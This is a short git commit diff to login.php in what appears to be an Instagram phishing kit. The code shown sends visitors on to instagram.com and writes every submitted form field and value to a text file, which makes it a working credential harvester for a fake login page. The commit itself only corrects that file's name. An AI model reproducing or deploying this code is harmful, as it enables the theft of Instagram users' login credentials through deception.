97d67e9b0fe8d0010606453ba18867f3e97965bf
techudz-ops <52400370+techudz-ops@users.noreply.github.com>
2019-07-01 20:28:57 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 header ('Location: https://www.instagram.com ');
-$handle = fopen("instagram.txt.txt", "a");
+$handle = fopen("instagram.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
